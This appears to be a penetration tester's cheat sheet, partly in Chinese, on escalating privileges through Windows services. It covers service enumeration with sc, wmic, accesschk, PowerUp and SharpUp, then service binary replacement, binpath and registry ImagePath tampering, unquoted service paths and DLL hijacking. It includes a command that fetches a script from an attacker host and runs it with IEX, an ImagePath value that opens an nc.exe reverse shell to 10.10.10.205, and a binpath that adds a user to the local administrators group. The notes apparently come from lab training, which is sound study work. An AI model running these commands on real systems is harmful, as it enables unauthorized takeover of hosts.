# Services Info
## General Check
```powershell
sc.exe qc {$service_name} # *_PATH_* || *_START_*
service info
sc create [servicename] binpath="c:\111.exe"

icacls
Get-ACL
Get-Service
get-service  -Id ..
get-service | ? {$_.DisplayName -like 'Druva*'}

# 非RDP下Cim可能会出错
Get-CimInstance
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'servicename'}  #查看服务的启动方式
#查找查找没有引号的服务
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """ # --> 最好用cmd执行

# 注册表中自动运行的二进制文件查找
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```
## PowerUp
UnquotedService/ModifiableServiceBinary Check
```powershell
# PowerUp.ps1
Get-UnquotedService
# AbuseFunction 替换服务的二进制文件的模块，默认行为是创建一个名为john的新本地管理员，密码为Password123！
Get-ModifiableServiceFile
Install-ServiceBinary -Name 'mysql' 
```
## AccessChk
针对使用于Reg键值查询及权限查看等功能
通过组查看可以修改的服务二进制文件
```powershell
#Reg查找弱键值的服务
.\accesschk.exe /accepteula "<current_user>" -kvuqsw hklm\System\CurrentControlSet\services
#查看服务权限
.\accesschk.exe /accepteula -quvcw <speicify service>
.\accesschk.exe -qlc <service_name>

accesschk.exe -ucqv <Service_Name> #Check rights for different groups

accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
## SharpUp
针对使用服务的ACLs
服务的自由访问控制列表来查看权限`HKLM\SYSTEM\CurrentControlSet\Services\`
```powershell
.\SharpUp.exe audit
```
# Running Monitor Script on Target Host
```powershell
 IEX (iwr 'http://<attack_Ip>/procmon.ps1') 
```

## Procmon.ps1
```powershell
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
___
# Exploit
## Service *Binary* DACL Abuse
```powershell
sc.exe start windowsscheduler
Restart-Service mysql
net stop mysql
shutdown /r /t 0

# Replace
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
#Service ACL mod
icacls WService.exe /grant Everyone:F

```
## Service Path Abuse
-->[[Editable Service]]
[accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
```powershell
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f

sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```
## Reg Key Abuse
```bash
#篡改键值
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

## Unquoted Service Path
Base on Service Path with blank
1. **check for unquoted**
```powershell
sc.exe qc "disk sorter enterprise" C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe" #AbuseFunction
```
2. find the **CUT OFF** service path
```powershell
C:\MyPrograms\Disk --> file Replace
move c:\{$payload_download_dir}\rev-svc2.exe c:\{$writable_path}\{$exploit_services}
```
***
### Abuse DLL File
#### Replace
```powershell
...
```
#### hijack DLL Path
[Procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon): 分析DLL加载情况


```powershell
$env:
dir env:
```



| Path                                                              |                                Example |
| :---------------------------------------------------------------- | -------------------------------------: |
| The directory from which the application loaded.                  | (C:\\Users\\Steve\\Document\\some.dll) |
| The system directory.                                             |      (C:\\Windows\\System32\\some.dll) |
| The 16-bit system directory.                                      |        (C:\\Windows\\System\\some.dll) |
| The Windows directory.                                            |                (C:\\Windows\\some.dll) |
| The current directory.                                            |                                        |
| The directories that are listed in the PATH environment variable. |         (C:\\Windows\\system32 etc...) |
